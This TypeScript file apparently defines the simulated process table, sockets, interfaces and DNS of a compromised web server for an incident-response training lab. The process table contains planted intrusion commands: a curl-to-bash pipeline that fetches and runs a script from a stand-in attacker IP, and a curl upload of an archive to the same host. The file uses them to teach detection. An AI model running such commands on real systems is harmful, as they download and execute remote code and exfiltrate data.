/**
 * Everything rmg-web-02 is beyond its filesystem: running processes, open
 * sockets, network interfaces, and name resolution.
 *
 * Like the filesystem, this is frozen at WORLD_NOW so that `ps`, `netstat`, and
 * `top` return the same answer every time an exercise is graded.
 *
 * The intrusion is visible here too, and deliberately not labelled: a beaconing
 * process sits in the middle of an ordinary process table, and an established
 * connection to the exfiltration host sits among legitimate ones. Finding them
 * is the exercise.
 */

import type { MachineState, VInterface, VProcess, VSocket } from './types.js';

const PROCESSES: VProcess[] = [
  { pid: 1, user: 'root', cpu: 0.0, mem: 0.1, vsz: 168_204, rss: 12_996, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:14', command: '/sbin/init' },
  { pid: 412, user: 'root', cpu: 0.0, mem: 0.2, vsz: 62_408, rss: 19_112, tty: '?', stat: 'S<s', start: 'Aug13', time: '0:03', command: '/lib/systemd/systemd-journald' },
  { pid: 508, user: 'root', cpu: 0.0, mem: 0.1, vsz: 25_112, rss: 6_204, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:01', command: '/lib/systemd/systemd-udevd' },
  { pid: 812, user: 'systemd-resolve', cpu: 0.0, mem: 0.1, vsz: 26_356, rss: 12_884, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:07', command: '/lib/systemd/systemd-resolved' },
  { pid: 878, user: 'root', cpu: 0.0, mem: 0.0, vsz: 8_912, rss: 3_112, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:00', command: '/usr/sbin/cron -f' },
  { pid: 903, user: 'message+', cpu: 0.0, mem: 0.0, vsz: 9_204, rss: 5_008, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:02', command: '/usr/bin/dbus-daemon --system' },
  { pid: 912, user: 'root', cpu: 0.0, mem: 0.1, vsz: 17_308, rss: 8_112, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:01', command: '/lib/systemd/systemd-logind' },
  { pid: 1_104, user: 'root', cpu: 0.0, mem: 0.0, vsz: 41_208, rss: 4_884, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:00', command: '/usr/lib/postfix/sbin/master -w' },
  { pid: 1_198, user: 'root', cpu: 0.0, mem: 0.1, vsz: 15_432, rss: 9_012, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:00', command: '/usr/sbin/sshd -D' },

  { pid: 1_422, user: 'root', cpu: 0.0, mem: 0.2, vsz: 55_308, rss: 17_204, tty: '?', stat: 'Ss', start: 'Aug13', time: '0:00', command: 'nginx: master process /usr/sbin/nginx -g daemon on; master_process on;' },
  { pid: 1_423, user: 'www-data', cpu: 0.4, mem: 0.3, vsz: 56_012, rss: 24_880, tty: '?', stat: 'S', start: 'Aug13', time: '3:41', command: 'nginx: worker process' },
  { pid: 1_424, user: 'www-data', cpu: 0.3, mem: 0.3, vsz: 56_012, rss: 24_112, tty: '?', stat: 'S', start: 'Aug13', time: '3:12', command: 'nginx: worker process' },

  { pid: 1_841, user: 'postgres', cpu: 0.2, mem: 2.4, vsz: 412_884, rss: 198_004, tty: '?', stat: 'Ss', start: '03:12', time: '1:52', command: '/usr/lib/postgresql/14/bin/postgres -D /var/lib/postgresql/14/main' },
  { pid: 1_902, user: 'postgres', cpu: 0.0, mem: 0.4, vsz: 412_884, rss: 33_112, tty: '?', stat: 'Ss', start: '03:12', time: '0:04', command: 'postgres: checkpointer' },
  { pid: 1_903, user: 'postgres', cpu: 0.1, mem: 0.5, vsz: 412_884, rss: 41_008, tty: '?', stat: 'Ss', start: '03:12', time: '0:31', command: 'postgres: walwriter' },

  { pid: 2_204, user: 'www-data', cpu: 1.8, mem: 3.1, vsz: 288_112, rss: 251_004, tty: '?', stat: 'Sl', start: 'Aug13', time: '18:22', command: '/usr/bin/python3 /usr/local/bin/gunicorn portal.wsgi --bind 127.0.0.1:8080 --workers 4' },
  { pid: 2_205, user: 'www-data', cpu: 1.2, mem: 2.9, vsz: 281_004, rss: 238_112, tty: '?', stat: 'Sl', start: 'Aug13', time: '14:07', command: '/usr/bin/python3 /usr/local/bin/gunicorn portal.wsgi --bind 127.0.0.1:8080 --workers 4' },
  { pid: 2_210, user: 'root', cpu: 0.0, mem: 0.1, vsz: 22_008, rss: 9_884, tty: '?', stat: 'S', start: 'Aug13', time: '0:12', command: '/usr/local/bin/disk-monitor --interval 300' },

  // Legitimate interactive sessions.
  { pid: 24_112, user: 'jmartel', cpu: 0.0, mem: 0.1, vsz: 18_204, rss: 6_112, tty: 'pts/2', stat: 'Ss', start: '07:38', time: '0:00', command: '-bash' },
  { pid: 24_880, user: 'student', cpu: 0.0, mem: 0.1, vsz: 18_204, rss: 6_004, tty: 'pts/0', stat: 'Ss+', start: '09:05', time: '0:00', command: '-bash' },

  // The intrusion. Unlabelled on purpose: a beacon loop and its parent shell.
  // A student who reads the command column carefully will notice a scheduled
  // curl-to-bash pipeline running as an account that did not exist yesterday.
  { pid: 25_702, user: 'sysmon', cpu: 0.0, mem: 0.0, vsz: 7_112, rss: 2_004, tty: '?', stat: 'S', start: '11:15', time: '0:00', command: '/bin/sh -c curl -s https://198.51.100.60/b -o /tmp/.cache/u && bash /tmp/.cache/u' },
  { pid: 25_711, user: 'sysmon', cpu: 0.7, mem: 0.1, vsz: 11_884, rss: 5_112, tty: '?', stat: 'S', start: '11:15', time: '0:02', command: 'bash /tmp/.cache/u' },
  { pid: 25_904, user: 'sysmon', cpu: 2.1, mem: 0.2, vsz: 24_112, rss: 12_880, tty: '?', stat: 'S', start: '11:16', time: '0:08', command: 'curl -s -T /tmp/.cache/pt.tar.gz https://198.51.100.60/u' },
];

const SOCKETS: VSocket[] = [
  // Listening services.
  { proto: 'tcp', localAddress: '0.0.0.0', localPort: 22, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTEN', pid: 1_198, program: 'sshd' },
  { proto: 'tcp', localAddress: '0.0.0.0', localPort: 80, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTEN', pid: 1_422, program: 'nginx' },
  { proto: 'tcp', localAddress: '0.0.0.0', localPort: 443, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTEN', pid: 1_422, program: 'nginx' },
  { proto: 'tcp', localAddress: '127.0.0.1', localPort: 8080, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTEN', pid: 2_204, program: 'gunicorn' },
  { proto: 'tcp', localAddress: '127.0.0.1', localPort: 5432, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTEN', pid: 1_841, program: 'postgres' },
  { proto: 'tcp', localAddress: '127.0.0.1', localPort: 25, remoteAddress: '0.0.0.0', remotePort: 0, state: 'LISTEN', pid: 1_104, program: 'master' },
  { proto: 'tcp6', localAddress: '::', localPort: 22, remoteAddress: '::', remotePort: 0, state: 'LISTEN', pid: 1_198, program: 'sshd' },
  { proto: 'udp', localAddress: '127.0.0.53', localPort: 53, remoteAddress: '0.0.0.0', remotePort: 0, state: '', pid: 812, program: 'systemd-resolve' },

  // Ordinary established traffic.
  { proto: 'tcp', localAddress: '10.20.6.40', localPort: 22, remoteAddress: '10.20.4.31', remotePort: 51_882, state: 'ESTABLISHED', pid: 1_198, program: 'sshd' },
  { proto: 'tcp', localAddress: '127.0.0.1', localPort: 8080, remoteAddress: '127.0.0.1', remotePort: 42_118, state: 'ESTABLISHED', pid: 2_204, program: 'gunicorn' },
  { proto: 'tcp', localAddress: '127.0.0.1', localPort: 5432, remoteAddress: '127.0.0.1', remotePort: 39_004, state: 'ESTABLISHED', pid: 1_841, program: 'postgres' },
  { proto: 'tcp', localAddress: '10.20.6.40', localPort: 443, remoteAddress: '10.20.4.58', remotePort: 60_112, state: 'ESTABLISHED', pid: 1_423, program: 'nginx' },
  { proto: 'tcp', localAddress: '10.20.6.40', localPort: 39_112, remoteAddress: '10.20.7.22', remotePort: 9_443, state: 'TIME_WAIT', pid: null, program: '-' },

  // The exfiltration channel, sitting quietly among the rest.
  { proto: 'tcp', localAddress: '10.20.6.40', localPort: 44_218, remoteAddress: '198.51.100.60', remotePort: 443, state: 'ESTABLISHED', pid: 25_904, program: 'curl' },
];

const INTERFACES: VInterface[] = [
  {
    name: 'lo',
    mac: '00:00:00:00:00:00',
    ipv4: '127.0.0.1',
    netmask: '255.0.0.0',
    ipv6: '::1',
    mtu: 65_536,
    up: true,
    rxPackets: 884_112,
    txPackets: 884_112,
    rxBytes: 412_884_002,
    txBytes: 412_884_002,
  },
  {
    name: 'eth0',
    mac: '06:2f:a1:4c:88:d3',
    ipv4: '10.20.6.40',
    netmask: '255.255.255.0',
    ipv6: 'fe80::42f:a1ff:fe4c:88d3',
    mtu: 1_500,
    up: true,
    rxPackets: 18_442_991,
    txPackets: 12_004_883,
    rxBytes: 9_884_002_117,
    txBytes: 4_112_884_009,
  },
];

/**
 * Names the simulated resolver knows about.
 *
 * Public names resolve to RFC 5737 documentation addresses rather than their
 * real ones. A student who later runs the same command against the internet will
 * see different numbers, and that is the correct trade: nothing here should
 * teach anyone that a lab address is a real destination.
 */
const DNS: Record<string, string> = {
  'localhost': '127.0.0.1',
  'rmg-web-02': '10.20.6.40',
  'rmg-web-02.ridgelinemed.example': '10.20.6.40',
  'rmg-web-01.ridgelinemed.example': '10.20.6.41',
  'rmg-backup-01.ridgelinemed.example': '10.20.9.15',
  'rmg-monitor-01.ridgelinemed.example': '10.20.9.40',
  'portal.ridgelinemed.example': '10.20.6.40',
  'ridgelinemed.example': '10.20.6.41',
  'example.com': '192.0.2.10',
  'www.example.com': '192.0.2.10',
  'google.com': '192.0.2.20',
  'www.google.com': '192.0.2.20',
  'ubuntu.com': '192.0.2.30',
};

const REVERSE_DNS: Record<string, string> = {
  '10.20.6.40': 'rmg-web-02.ridgelinemed.example',
  '10.20.6.41': 'rmg-web-01.ridgelinemed.example',
  '10.20.9.15': 'rmg-backup-01.ridgelinemed.example',
  '10.20.9.40': 'rmg-monitor-01.ridgelinemed.example',
  '192.0.2.10': 'example.com',
  '192.0.2.20': 'google.com',
  '8.8.8.8': 'dns.google',
  // The attacker's infrastructure has no reverse record, which is itself a
  // small, realistic signal.
};

export const MACHINE: MachineState = {
  hostname: 'rmg-web-02',
  loadAverage: [0.52, 0.71, 0.68],
  uptimeText: '1 day, 10:43',
  processes: PROCESSES,
  sockets: SOCKETS,
  interfaces: INTERFACES,
  dns: DNS,
  reverseDns: REVERSE_DNS,
};
